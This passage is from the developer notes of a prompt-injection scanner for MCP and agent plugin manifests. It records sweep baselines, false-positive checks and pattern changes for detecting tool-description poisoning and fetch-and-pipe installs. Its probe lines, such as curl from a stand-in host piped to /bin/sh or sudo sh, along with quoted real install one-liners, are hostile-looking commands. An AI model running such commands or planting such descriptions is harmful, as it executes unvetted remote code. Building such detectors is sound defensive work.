# Phase 4 Plan 01 — Pre-edit GATE-03 baseline (2026-09-03)

**This is the pre-edit baseline for every `--compare` run in Phase 4 (plans 04-04, 04-05, 04-06,
04-07). It was captured before a single CAT-02 pattern, YAML edit or corpus payload was written.**
`scripts/gate03-sweep.sh --compare` is one-directional — it only prints findings present in the
CANDIDATE and absent from the BASELINE — and patterns are compiled into the binary at build time,
so re-capturing this baseline after any pattern edit destroys its only purpose. Do not regenerate
it; if the directory list needs to change, capture a new baseline under a new date and say so
explicitly in the plan that needs it.

## Binary provenance

| | |
|---|---|
| Git SHA | `b4f05ef7bb4c12039e862ea1cb62a45cd76466ac` |
| Commit subject | `docs(04): plan Phase 4 — CAT-02 MCP tool-description poisoning (7 plans, 6 waves)` |
| Binary version | `injection-scanner 0.1.0` |
| Pattern set | shipping 56-pattern set (`PI001`–`PI057` embedded categories), zero CAT-02 patterns |
| Tree state at build time | clean — `git diff --quiet && git diff --cached --quiet` confirmed before the build, per the plan's precondition |

## Directory list

Base list recovered with `git show 752ac98:.planning/phases/03-tool-permission-abuse-cat-01-33/sweep-2026-09-02/manifest.tsv`
(Phase 3's baseline). The one entry dropped from that list: `.claude/worktrees/agent-a722421e377079562`
— that executor's own session worktree, which no longer exists on this machine.

Extended per D-06 and 04-RESEARCH.md §Q5 with real MCP-manifest-holding directories found by
`find ~ \( -iname ".mcp.json" -o -iname "mcp.json" -o -iname "claude_desktop_config.json" \) -not -path "*/node_modules/*"`
(49 real files found, spanning Claude Code plugin marketplaces, Codex plugin backups, Cursor,
VS Code, Kiro, Warp, GitHub Copilot IntelliJ, and three sibling project repos on this machine).

| Directory | Files | Findings | Status | Notes |
|---|---:|---:|---|---|
| `~/.claude/plugins/cache` | 952 | 10 | swept | in Phase 3 list |
| `~/.claude/skills` | 71 | 0 | swept | in Phase 3 list |
| `~/.claude/gsd-core` | 555 | 14 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/01-spec-linter` | 48 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/02-ai-changelog` | 50 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/04-spec-ci-plugin` | 43 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/05-budget-breaker` | 59 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/06-token-dashboard` | 76 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/07-mcp-hub` | 403 | 1 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/08-kore-runtime` | 204 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/09-agent-tracer` | 106 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/10-agent-memory` | 49 | 0 | swept | in Phase 3 list; also one of D-06/Q5's "three sibling project repos" |
| `.../unity-in-flow-ai/11-context-manager` | 6 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/12-agent-replayer` | 182 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/13-eu-ai-act-toolkit` | 102 | 3 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/14-agent-sandbox` | 60 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/15-llm-diff` | 63 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/16-prompt-vc` | 48 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/17-skills-registry` | 172 | 8 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/18-agent-bench` | 7 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/19-skill-composer` | 58 | 0 | swept | in Phase 3 list |
| `.../unity-in-flow-ai/20-mcp-test` | 71 | 1 | swept | in Phase 3 list |
| `~/.claude/plugins/marketplaces` | 5,727 | 156 | swept | **NEW** — named explicitly by the task text, alongside `plugins/cache`; 17 `.mcp.json` files live here, incl. Context7, playwright, github (the Q3 near-miss corpus) |
| `~/.codex/.tmp` | 10,741 | 108 | swept | **NEW** — "Codex plugin backups", named in Q5; holds the live `plugins/` tree and two `plugins-backup-*` trees, each with real `.mcp.json` manifests |
| `~/.cursor` (config subset — see below) | 755 | 1 | swept | **NEW, narrowed** — see "Directories narrowed to avoid a reproduced crash" |
| `~/.vscode` (config subset — see below) | 2 | 0 | swept | **NEW, narrowed** — see "Directories narrowed to avoid a reproduced crash" |
| `~/Library/Application Support/Code/User` | 2,792 | 276 | swept | **NEW** — VS Code "global" config, per Q5's "VS Code (both workspace and global)"; holds the real `mcp.json` with the `servers` wrapper key measured in Q1 |
| `~/.kiro/settings` | 1 | 0 | swept | **NEW** — Kiro, named in Q5 |
| `~/.warp` | 28 | 0 | swept | **NEW** — Warp, named in Q5; holds the real `mcpServers`-wrapped `.mcp.json` measured in Q1 |
| `~/.config/github-copilot/intellij` | 3 | 0 | swept | **NEW** — the JSONC (`//`-commented) house-style manifest that is Q1's documented parser gap; 0 findings here is expected, not evidence of cleanliness (the file cannot be parsed at all — see Q1) |
| `.../workspace-1-ideas/cannaryandbg` | 183 | 5 | swept | **NEW** — one of Q5's "three sibling project repos", outside the `unity-in-flow-ai/` ecosystem |
| `.../workspace-1-ideas/animations-learning/pattern-atlas` | 121 | 1 | swept | **NEW** — the other of Q5's "three sibling project repos" |

**Total across all 32 swept rows: 23,738 files scanned, 584 findings.** Comfortably over
GATE-03's ~1,300-file stated breadth. Zero rows are `skipped-missing` — every directory in the
recorded list is present on this machine.

`manifest.tsv` has one row per directory above; `summary.tsv` aggregates by pattern id and
severity (22 distinct `(pattern_id, severity)` pairs; `PI049` — recall miscellaneous, MEDIUM —
dominates at 274, mostly config/settings prose across the plugin marketplace and Codex trees).

## Directory not added: `~/.claude` root

`~/.claude/claude_desktop_config.json` is a real manifest sitting directly at `~/.claude`'s root,
found by the same `find` enumeration. It was deliberately **not** added as its own sweep row:
`~/.claude`'s three genuinely distinct config subdirectories (`plugins/cache`, `skills`,
`gsd-core`) are already swept individually, and `~/.claude` also contains large, permission-
restricted, session/telemetry-bearing subdirectories (`sessions`, `projects`, `debug`) that are
not MCP-manifest sources. Sweeping the whole root would duplicate the three already-swept
subdirectories' counts inside a fourth, much larger row and pull in unrelated personal session
data for no measurement benefit. This is a deliberate scoping decision, not an oversight.

## Directories narrowed to avoid a reproduced crash

Running the release binary against the full `~/.cursor` and (by the same code path and risk
profile) `~/.vscode` directories risks a real, reproduced panic — see "A production crash found
during this baseline capture" below. `gate03-sweep.sh` treats any non-`0`/`1`/`2` scanner exit as
fatal to the entire sweep run (by design — it is meant to catch exactly this class of bug), so
sweeping either directory whole would have aborted the baseline capture entirely.

Both directories' `extensions/` subtrees (vendored third-party extension/plugin bundles — the
same class of noise as `node_modules`, which Q5 explicitly excludes for `07-mcp-hub`) were
excluded. What was swept instead, copied into scratch directories outside this repository
(`/private/tmp/.../scratchpad/{cursor-safe,vscode-safe}`, per the same outside-repo-scratch
discipline Q1's own probe pattern used):

- **`~/.cursor` (755 files swept):** `agents/`, `ai-tracking/`, `commands/`, `config/`,
  `gsd-core/`, `hooks/`, `projects/`, `scripts/`, `skills/`, `skills-cursor/`, and the six
  top-level JSON files (`argv.json`, `gsd-file-manifest.json`, `gsd-install-state.json`,
  `hooks.json`, `ide_state.json`, **`mcp.json`**). Excluded: `extensions/` (40,516 files — the
  crash source) and `plugins/` (0 files found; empty on this machine).
- **`~/.vscode` (2 files swept):** `argv.json`, `mcp.json`. Excluded: `extensions/` (31,520
  files, same code path/risk as `~/.cursor/extensions`, not individually reproduced but not
  worth the risk of aborting the run to find out); `cli/` (0 files, empty).

Both narrowed directories, and the untouched `~/Library/Application Support/Code/User` VS Code
global config (2,792 files, no `extensions/` subtree), were confirmed to complete with a normal
`0`/`1` exit before being folded into the full run.

## A production crash found during this baseline capture

Scanning `~/.cursor/extensions` with the release binary panics:

```
thread 'main' panicked at src/frontmatter.rs:219:26:
assertion failed: self.is_char_boundary(new_len)
```

Same failure shape as the ENG-02 `tail[..12]` panic GATE-03 caught in Phase 2 (a fixed-byte-offset
`String::truncate`/slice on real multi-byte UTF-8 content) — a different call site
(`src/frontmatter.rs`'s structural-projection scalar renderer, not the decoder), reproduced
against real, unmodified, third-party files already on this machine. Full transcript and the
exact source line are recorded in `sweep-baseline-2026-09-03/panic-cursor-extensions.txt`.

**Not fixed here.** Task 1 of this plan must leave zero source-code diff — the whole point of
capturing this baseline is that it comes from the binary as it ships today, before any CAT-02
edit. Recorded as a discovered issue; a follow-up issue should be filed (same tier as WR-02/WR-03
below, but higher severity — this is a live crash on real bytes, not a documentation debt).

## Whole-repo self-scan baseline

Command (per `.claude/skills/pattern-library/SKILL.md` §"Scan the whole repo, not just the
corpus"): `injection-scanner check . --exclude '.planning/**' --format json`, findings outside
`examples/`, `patterns/`, `tests/`, `tools/` filtered out.

**Result: exactly the two accepted, pre-existing standing self-matches, nothing else.**

| File | Line | Pattern |
|---|---:|---|
| `docs/PATTERN-CATALOGUE.md` | 74 | `PI001` |
| `docs/PATTERN-CATALOGUE.md` | 903 | `PI031` |

These are the two catalogue self-matches named in `.planning/STATE.md` and `.continue-here.md`
(rendered `example`/`counter_example` values quoted in double quotes rather than backticks) —
identical under v0.1.0, predating this milestone, with no issue of their own yet. A third finding
appearing in a later plan's self-scan is the signal to watch for.

## Test count

`cargo test --locked`: **353 tests, all passing.** Matches `.planning/STATE.md`'s recorded
baseline exactly, confirming the tree was unmodified at capture time.

## What this baseline is for

Every later plan in this phase (04-04 PI060–PI062, 04-05 PI063–PI065, 04-06 PI066–PI069, and
04-07's final reconciliation) runs `scripts/gate03-sweep.sh <candidate-dir> <same directory list>`
against its own edited binary, then `scripts/gate03-sweep.sh --compare
sweep-baseline-2026-09-03 <candidate-dir>` to see exactly what a new pattern newly catches in real,
third-party files. Because `--compare` is one-directional (candidate minus baseline only), a later
plan that needs to confirm nothing *disappeared* must diff in both directions explicitly — this
baseline's `manifest.tsv`/`*.json` files are the fixed reference point for that comparison, and
must not be regenerated once a CAT-02 pattern exists.

---

# Phase 4 Plan 04 — GATE-03 delta for the structural half (2026-09-06)

**Verdict: one addition, zero removals, no re-narrowing needed.** PI060, PI061 and PI062 add
exactly one finding across 23,764 real third-party files, and it is a true positive on a real
manifest. Nothing that the pre-04-04 binary reported disappeared.

## Deviation from the plan, stated up front

The plan named the output directory `sweep-after-04-04-2026-09-03`. This ran on **2026-09-06**, so
the directory is `sweep-after-04-04-2026-09-06`; the date in a plan written on 09-03 is not a
contract about when the run happens.

More importantly, the plan assumed **one** comparison pair — the 04-01 baseline binary (`b4f05ef`)
against this plan's binary. That is no longer a clean attribution, because `main` moved underneath
Phase 4: commit `0d50e92` merged PR #110 (`aaaadad`, "Hidden HTML as context, badge-safe beacons,
every measured miss closed"), which retired `PI017` into `MatchContext::HiddenHtml` and made
`PI026` badge-safe. Comparing straight to `b4f05ef` therefore attributes PR #110's delta to plan
04-04. **A third sweep was run to separate them**, with a release binary built from `0d50e92`
itself — the exact tree this branch started from, PR #110 merged, zero CAT-02 patterns. Both
directions were then run against that, which is the comparison that actually isolates this plan's
work. Both directions against `b4f05ef` are also recorded below, for continuity with 04-01.

## Runs

| Run | Binary tree | Pattern set | Files | Findings | Output |
|---|---|---|---:|---:|---|
| 04-01 baseline | `b4f05ef` | 56 patterns, zero CAT-02 | 23,738 | 584 | `sweep-baseline-2026-09-03/` |
| main-base (NEW) | `0d50e92` (PR #110 merged) | 61 patterns, zero CAT-02 | 23,764 | 518 | `sweep-mainbase-04-04-2026-09-06/` |
| 04-04 candidate | this branch after Task 2 | 64 patterns, PI060–PI062 | 23,764 | 519 | `sweep-after-04-04-2026-09-06/` |

All three runs used the **same 32-directory list**, reproduced from
`sweep-baseline-2026-09-03/manifest.tsv` rather than re-derived — verified programmatically:
`directory list identical: True`, 32 rows in each manifest, `swept` in every row, zero
`skipped-missing`.

Raw per-directory JSON reports are kept out of the public history for the reason recorded in the
baseline's `RAW-REPORTS.md` (they inventory one developer machine). Each run's committed directory
carries `manifest.tsv`, `summary.tsv` and `checksums.sha256` over its 32 raw reports; the reports
themselves live in the gitignored `.planning/local/<run-name>/`.

## Per-directory file counts, and the one row that moved

Only one directory's file count moved at all between the baseline and the two 2026-09-06 runs:

| Directory | Files then | Files now | Change |
|---|---:|---:|---|
| `~/.claude/plugins/cache` | 952 | 978 | **+26 (+2.7%)** |

Every other one of the 32 rows is byte-for-byte identical in file count. +2.7% is under the
"more than a few percent" flag threshold, and it is the expected shape of a plugin cache on a
machine that has installed plugins in the three days since — the corpus drifted slightly, it did
not shift. The two 2026-09-06 runs saw an **identical** corpus (23,764 files each, row for row),
so the comparison that carries this plan's verdict is not affected by the drift at all.

## Direction 1 — ADDITIONS (main-base `0d50e92` → 04-04 candidate)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-mainbase-04-04-2026-09-06 \
    .planning/local/sweep-after-04-04-2026-09-06
$HOME/.claude/plugins/marketplaces/claude-plugins-official/external_plugins/serena/.mcp.json:4	PI060
exit=1
```

**One entry. Adjudicated:**

| File | Line | Pattern | Verdict |
|---|---:|---|---|
| `~/.claude/plugins/marketplaces/claude-plugins-official/external_plugins/serena/.mcp.json` | 4 | `PI060` | **TRUE POSITIVE** |

Opened and read. The file is a real, wrapper-less `.mcp.json` from the official Claude plugin
marketplace whose entire content is one server launched as
`uvx --from git+https://github.com/oraios/serena serena start-mcp-server`. The projected leaf
`serena.args[1] = git+https://github.com/oraios/serena` is precisely the shape PI060 names: an MCP
server whose code is fetched from a git repository rather than from a package registry, so what
the agent loads is whatever that repository's default branch holds at install time, unpinned and
unpublished.

That the server itself is a well-known, benign project does not make the finding false. The signal
is a supply-chain property of the *installation*, not a claim about the *author*, which is exactly
why D-03 puts this band at MEDIUM — below the severity `install-hook` blocks commits at — rather
than at HIGH. A user who has deliberately chosen a git-installed server sees one MEDIUM
observation and moves on; nothing is blocked.

It is also the only such manifest on this machine. The Task 1 probe measured **1 off-registry
install source in 46 real manifests**, and this sweep independently reproduces that count on a
much larger corpus: one PI060 finding in 23,764 files.

**PI061 and PI062 add zero findings.** That is the measurement, not a defect: 04-RESEARCH.md §Q2
found every endpoint across 49 real manifests on TLS, and no real manifest on this machine launches
a server by piping a download into a shell. Both patterns are exercised by unit tests, by their
`example`/`counter_example` pairing, by their `relaxed_pattern` mutation control, and by
`examples/mcp-tool-poisoning-attack.md` via the attack-corpus ratchet; PI061 additionally moves the
recall row. They are covered, they simply have no real-world instance here.

## Direction 2 — REMOVALS (arguments swapped: 04-04 candidate → main-base `0d50e92`)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-after-04-04-2026-09-06 \
    .planning/local/sweep-mainbase-04-04-2026-09-06
exit=0
```

**Empty. Zero entries, nothing to adjudicate.** This is the direction the script cannot see on its
own and the reason the plan required the swap. It rules out the specific hazard the plan named:
three new `scope: frontmatter` patterns arm the structural pass on documents where it may not have
run before, and a finding that *disappeared* would mean a document had stopped being parsed rather
than stopped being suspicious. Nothing disappeared, so nothing in that class happened.

## Both directions against the 04-01 baseline (`b4f05ef`), for continuity

**Additions: 1 — the same `serena/.mcp.json:4 PI060` entry above, and nothing else.**

**Removals: 66**, and every one predates this branch. By pattern:

| Pattern | Removals | Mechanism |
|---|---:|---|
| `PI026` | 39 | PR #110 (`aaaadad`) made the beacon arm badge-safe. Shields/badge image URLs in READMEs no longer produce a finding. |
| `PI017` | 27 | PR #110 retired `PI017` as a finding of its own; hidden HTML styling is now a *context* on the finding it wraps (`MatchContext::HiddenHtml`), not a separate report. `PI017` is no longer in the pattern set at all. |

Both mechanisms are named in PR #110's own commit subject — "Hidden HTML as context, badge-safe
beacons" — and both are on `main`. The conclusive evidence that none of the 66 belongs to plan
04-04 is Direction 2 above: against the binary built from `0d50e92`, this plan removes **zero**
findings. The 584 → 518 drop happened when PR #110 merged, before a line of this plan was written.

## No re-narrowing was performed

The additions list contains no false positive, so the stop-and-re-narrow branch was not entered.
`cargo test --locked` is green, recall is re-pinned (CAT-02 structural 4/8 → 5/8, total 99/109 →
100/109), and `docs/PATTERN-CATALOGUE.md` plus `.github/code-scanning-baseline.json` were
regenerated in the commits that changed the pattern library.

## Carried into plan 04-05

- The 04-01 baseline (`b4f05ef`) is now **two pattern-set generations old**. Plans 04-05 to 04-07
  should compare against `sweep-mainbase-04-04-2026-09-06` or a newer pre-edit capture, not
  against `sweep-baseline-2026-09-03`, or they will re-inherit PR #110's 66 removals as if they
  were their own.
- `~/.claude/plugins/cache` is drifting (+2.7% in three days). A later plan comparing against a
  baseline captured today should expect that row to keep moving.

---

# Issue #122 — GATE-03 delta for PI028/PI062's widened launcher vocabulary (2026-09-07)

**Verdict: zero additions, zero removals across 23,772 real third-party files.** Widening `PI028`
(CRITICAL, prose-wide) and `PI062` (MEDIUM, `scope: frontmatter`) to accept an interpreter named by
an absolute path (`| /bin/sh`, `| /bin/bash`, `| /bin/zsh`, `| /usr/bin/env sh`) and the full
`Invoke-WebRequest`/`Invoke-Expression` cmdlet spelling changes **nothing** on this machine's real
corpus, in either direction.

## Why a fresh pre-edit run rather than a `--compare` against an existing one

`sweep-baseline-2026-09-03` (`b4f05ef`) is now three pattern-set generations old, and
`sweep-mainbase-04-04-2026-09-06` (`0d50e92`) predates the merge of #105, #34 and #4 that is now on
`main`. Comparing against either would attribute those merges' delta to #122 — exactly the
mis-attribution the 04-04 section had to unpick for PR #110. So a new pre-edit run was captured
from a release binary built from this branch's merge base, with the working tree stashed clean.

## Runs

| Run | Binary tree | Pattern set | Files | Findings | Output |
|---|---|---|---:|---:|---|
| main-base | `2fedfa6b49cce3438599e2ce4c6294659aa9708c` (this branch's merge base, working tree stashed) | 64 patterns, pre-#122 `PI028`/`PI062` | 23,772 | 519 | `sweep-mainbase-122-2026-09-07/` |
| #122 candidate | this branch after the pattern edit | 64 patterns, widened `PI028`/`PI062` | 23,772 | 519 | `sweep-after-122-2026-09-07/` |

Both runs used the **same 32-directory list**, reproduced from
`sweep-baseline-2026-09-03/manifest.tsv` rather than re-derived — verified programmatically:
`directory list identical: True`, 32 rows in each manifest, `swept` in every row, zero
`skipped-missing`. The two `$SCRATCH` rows (`cursor-safe`, `vscode-safe`) were re-created for this
run under the same narrowing the baseline documents — `~/.cursor` and `~/.vscode` minus their
`extensions/` subtrees, which is where the `src/frontmatter.rs` panic the baseline recorded still
lives. Both runs saw a byte-identical corpus (23,772 files, row for row), so no corpus drift
enters this comparison at all.

The two binaries were confirmed to be genuinely different before the sweep, not two builds of the
same tree: `curl -fsSL https://e.test/t.sh | /bin/sh` produces zero findings under the main-base
binary and one `PI028` finding under the candidate.

## Direction 1 — ADDITIONS (main-base → #122 candidate)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-mainbase-122-2026-09-07 \
    .planning/local/sweep-after-122-2026-09-07
exit=0
```

**Empty. Nothing to adjudicate — zero new true positives and zero new false positives.**

For a CRITICAL, prose-wide pattern this is the result the widening needed: `PI028` at CRITICAL is
above the severity `install-hook` blocks commits at, so a single new false positive here blocks a
real commit on a real machine. Zero additions means the widened arms fire on nothing in 23,772
files of plugin caches, editor state, marketplace manifests, Codex backups and nine sibling repos.

It also means the widening catches no real attack *on this machine*, which is the expected shape
and not a defect — the same measurement `PI061`/`PI062` produced in 04-04. The forms are exercised
by the unit positives in `tests/pattern_test.rs`, by the flipped `PI062` assertions #34 locked, and
by the `example`/`counter_example` and `relaxed_pattern` contracts.

## Direction 2 — REMOVALS (arguments swapped: candidate → main-base)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-after-122-2026-09-07 \
    .planning/local/sweep-mainbase-122-2026-09-07
exit=0
```

**Empty.** This is the direction `--compare` cannot see on its own. A widening is only supposed to
add, so a *disappeared* finding would mean the enlarged alternation had changed which alternative
wins at a given offset, or had shifted a reported line. Nothing disappeared, and per-directory
finding counts are identical row for row (519 = 519).

## The false-positive control was mutation-tested, not asserted

`PI028` is below `PI050`, so `relaxed_pattern`/GATE-05 does not apply to it and the control is the
manual discipline `.claude/skills/pattern-library/SKILL.md` describes. Two mutations were applied to
the shipped regex and the corpus was confirmed to go red under both:

| Mutation | What it removes | Result |
|---|---|---|
| pipe target → `\S+` | the closed list of shell names | `corpus_test` **red** — `security-runbook.md`, 4 matches under `--strict` |
| drop the fetch-and-pipe requirement, key on the interpreter alone | that a remote fetch is being executed | `corpus_test` **red** — `security-runbook.md`, 2 findings / 13 strict matches |

The first mutation left the clean corpus **green** before this change: nothing in fifteen files
piped a fetch into a non-shell filter, so the only thing catching it was per-pattern negatives —
the weaker of the two gates, and the exact failure mode #95 recorded. `tests/corpus/clean/security-runbook.md`
grew three `curl … | jq / sha256sum / tar` lines and two bare interpreter mentions so the corpus
itself now holds the property. That is adding a specimen so an over-wide pattern *fails*, which the
SKILL explicitly distinguishes from editing a specimen so a pattern passes.

## Pre-measurement before the pattern was written

Before either regex was edited, the candidate alternation was run as a plain Python regex over the
same 32 directories and scored against the *old* one: **0 lines matched by the new pattern and not
by the old, across 26,285 files.** The full sweep above then confirmed it against the real binary
and the real projection/normalization passes.

---

# Issue #122 review r1 — GATE-03 delta for the SECOND widening (2026-09-07)

**Verdict: zero reported findings added, zero removed, across the same 23,772 real third-party
files. Five new `low_confidence` matches, all of them true positives, all fenced.**

Review r1 finding 2 was reproduced and confirmed: the launcher token had to be bare and unquoted,
so quoting it, prefixing `sudo`/`command`/`exec`, giving `env` an option, or using
`irm`/`Invoke-RestMethod` walked straight past both patterns. The shared vocabulary was widened a
second time (see the comment block at `PI028` in `patterns/core/exfiltration.yaml` for the full
list, and for the forms left deliberately open with the measured reason for each).

## Runs

| Run | Binary tree | Files | Reported findings | Output |
|---|---|---:|---:|---|
| main-base (unchanged baseline) | `2fedfa6` | 23,772 | 519 | `sweep-mainbase-122-2026-09-07/` |
| r1 candidate (first widening) | `970956f` | 23,772 | 519 | `sweep-after-122-2026-09-07/` |
| **r2 candidate (this widening)** | this branch | 23,772 | 519 | `sweep-r2-122-2026-09-07/` |

Same 32-directory list as both earlier runs, taken from `sweep-mainbase-122-2026-09-07/manifest.tsv`
rather than re-derived; 32 rows, `swept` in every row, zero `skipped-missing`, byte-identical corpus
row for row. `summary.tsv` is **identical** to main-base's, pattern id for pattern id.

Binary provenance confirmed different before the sweep: `curl -fsSL https://e.test/t.sh | sudo sh`
yields one `PI028` finding under the r2 binary and zero under both earlier ones.

## Direction 1 — ADDITIONS (main-base -> r2)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-mainbase-122-2026-09-07 \
    .planning/local/sweep-r2-122-2026-09-07
exit=0
```

**Empty.** No new reported finding on any of 23,772 files. `PI028` is CRITICAL — above the severity
`install-hook` blocks commits at — so this is the number that had to be zero.

## Direction 2 — REMOVALS (arguments swapped)

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-r2-122-2026-09-07 \
    .planning/local/sweep-mainbase-122-2026-09-07
exit=0
```

**Empty.** Nothing the enlarged alternation stopped winning, and no shifted line numbers.

## What `--compare` cannot see: the low-confidence bucket

`--compare` keys on reported findings only. Parsing all four buckets out of the raw reports shows
where this widening actually landed:

| Bucket | main-base | r1 | r2 | added (base -> r2) | removed |
|---|---:|---:|---:|---:|---:|
| `matches` (reported) | 502 | 502 | 502 | **0** | 0 |
| `low_confidence` | 242 | 242 | **247** | **+5** | 0 |
| `suppressed` | 0 | 0 | 0 | 0 | 0 |
| `baselined` | 0 | 0 | 0 | 0 | 0 |

The five, every one at `context: fenced_code, confidence 0.2`:

| Matched text | Where | New arm |
|---|---|---|
| `curl -s https://fluxcd.io/install.sh \| sudo bash` | `$HOME/.claude/plugins/cache/claude-code-workflows/kubernetes-operations/1.2.2/skills/gitops-workflow/SKILL.md:120` | `sudo` |
| `curl -s https://fluxcd.io/install.sh \| sudo bash` | `$HOME/.claude/plugins/marketplaces/claude-code-workflows/plugins/kubernetes-operations/skills/gitops-workflow/SKILL.md:120` | `sudo` |
| `curl -fsSL https://rpm.nodesource.com/setup_22.x \| sudo bash` | `$HOME/.claude/plugins/marketplaces/specweave/docs-site/docs/guides/troubleshooting/common-errors.md:121` | `sudo` |
| `irm https://astral.sh/uv/install.ps1 \| iex` | `$HOME/.claude/plugins/marketplaces/claude-code-workflows/plugins/python-development/skills/uv-package-manager/SKILL.md:61` | `irm` |
| `irm https://install.boltz.bio/boltz-api/install.ps1 \| iex` | `$HOME/.codex/.tmp/plugins/plugins/boltz-api-cli/skills/boltz-cli-setup/SKILL.md:37` | `irm` |

**Adjudication: all five are true positives, and they are the strongest evidence in this issue that
the widening is aimed correctly.** Each one sits *directly beside* a line the pre-#122 vocabulary
already matched — the uv skill's line 58 is `curl -LsSf https://astral.sh/uv/install.sh | sh` and
its line 61 is the Windows half, `irm … | iex`; the boltz skill is the same pair at lines 31 and 37;
`common-errors.md` already contributed four `curl … | bash` hits and gains the `| sudo bash` sibling
at line 121. The old regex was matching the POSIX spelling of an install one-liner and missing the
PowerShell and `sudo` spellings of *the same instruction in the same document*. That is a detection
gap, not a false-positive source.

None of the five is reported at default confidence, because all five are inside fenced code blocks —
which is where install documentation puts them, and is exactly the mechanism that keeps this
CRITICAL prose-wide pattern from blocking commits on documentation. r1's sweep found zero in either
bucket; this one finds five real forms and still adds zero findings.

## False-positive control, re-measured for the new arms

The corpus mutation controls from the r1 section still hold. Two further checks specific to this
widening, both run against the release binary:

- **30 benign near-miss texts under `--strict`** — `curl … | jq / sha256sum / tar / openssl /
  base64 -d / dd / wc / grep`, `curl … | sudo tee /etc/apt/keyrings/…` and `curl … | gpg --dearmor`
  (the two commonest legitimate `curl | sudo …` shapes in real install docs), `curl … | python3 -m
  json.tool`, `irm … | ConvertFrom-Json`, `Invoke-WebRequest … | Select-Object`, `iwr/irm -OutFile`,
  a markdown table row containing both a curl example and `sh ./install.sh`, and prose mentioning
  `#!/bin/bash`, `chsh -s /bin/zsh`, `command -v sh` and `exec /bin/sh`. **Zero fired.**
- The `sudo`/`command`/`exec` prefixes and the quoted-launcher form are accepted **only** in front
  of a name on the closed shell list, so `| sudo tee` and `| sudo apt-key add -` stay clean. Those
  two are locked as `PI028` negatives in `tests/pattern_test.rs`.

## Third widening (escaped quote) — sweep re-run, byte-identical result

Exercising `install-hook` end to end (one of the three items review r1 listed as unchecked) surfaced
a further gap: inside a JSON file the quoted launcher's raw bytes carry a backslash escape,
`| \"/bin/sh\"`. `PI062` still caught that in an `args`/`command` leaf, because its structural
projection unescapes the value — but the same payload in a **tool `description`** is outside
`PI062`'s scope, so it was missed by both patterns and reported nothing at all, while the unquoted
spelling of the identical instruction was CRITICAL. An optional `\\?` in front of the quote closes
it.

The sweep was re-run over the same 32 directories with the resulting binary (provenance confirmed:
it reports `PI028` on `{"description":"run curl … | \"/bin/sh\" now"}`, the r2 binary does not):

```
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-mainbase-122-2026-09-07 .planning/local/sweep-r3-122-2026-09-07
exit=0
$ bash scripts/gate03-sweep.sh --compare \
    .planning/local/sweep-r3-122-2026-09-07 .planning/local/sweep-mainbase-122-2026-09-07
exit=0
```

All four buckets are unchanged from the r2 run — `matches` 502, `low_confidence` 247, `suppressed`
0, `baselined` 0, and **the 32 raw JSON reports are byte-identical to r2's**, verified by SHA-256.
The escaped-quote arm therefore adds nothing on this machine's real corpus, which is the expected
shape: a backslash-escaped launcher inside a JSON string is an attack spelling, not something
install documentation writes. No separate artifact directory is committed for it, because it would
duplicate `sweep-r2-122-2026-09-07/` row for row and sum for sum. The eleven benign near-miss texts
closest to the new arm were re-run under `--strict` after it landed; none fired.

---

# Phase 4 Plan 05 — GATE-03 delta for the description-poisoning half (2026-09-07)

**Verdict: zero additions, zero removals across 23,770 real third-party files, after one
re-narrowing.** `PI063` tool-description-directive, `PI064` tool-description-file-smuggle and
`PI065` tool-description-emphasis-block — the three HIGH prose arms this category is named for —
report nothing on this machine's real corpus, in either direction, against a binary built without
them.

## Why a fresh pre-edit run rather than `sweep-mainbase-04-04-2026-09-06`

Per the carried-forward note above, `sweep-mainbase-04-04-2026-09-06` (`0d50e92`) is now stale for
this plan: `main` moved through issue #122's two launcher-vocabulary widenings, #125 (unique test
temp dirs), #126 (`PI028`/`PI062` widened further, `security-runbook.md` grew) and #127
(`PI012`/`PI013` counter_examples, catalogue/baseline regenerated) since 04-04 shipped. Comparing
straight to either `sweep-baseline-2026-09-03` (04-01) or `sweep-mainbase-04-04-2026-09-06` would
attribute that intervening history to this plan. A release binary was therefore built from
`66bf53c` — the commit this branch forked from — in a separate `git worktree` (no `git stash`
used), and swept fresh over the same 32-directory list. This run, `sweep-mainbase-04-05-2026-09-07/`,
is both this plan's pre-edit baseline AND the correct "post-structural, pre-prose" reference point
Task 3 asked for: it carries the identical `PI060`-`PI062` structural arms the candidate does,
differing only in the three prose arms this plan adds.

## Runs

| Run | Binary tree | Pattern set | Files | Findings | Output |
|---|---|---|---:|---:|---|
| mainbase-04-05 (fresh pre-edit) | `66bf53c` (this branch's fork point, `git worktree`, no stash) | 64 patterns, zero `PI063`-`PI065` | 23,770 | 519 | `sweep-mainbase-04-05-2026-09-07/` |
| after-04-05 (candidate, re-narrowed) | this branch after Task 2, `PI063` fixed for the case-fold false positive below | 67 patterns, `PI063`-`PI065` shipped | 23,770 | 519 | `sweep-after-04-05-2026-09-07/` |

Both runs used the **same 32-directory list**, reproduced from `sweep-baseline-2026-09-03/manifest.tsv`
rather than re-derived: 32 rows in each manifest, `swept` in every row, zero `skipped-missing`,
byte-identical file counts row for row (`diff` on the directory-name column empty). The two
binaries were confirmed genuinely different before the sweep: scanning a `PI063`-shaped probe
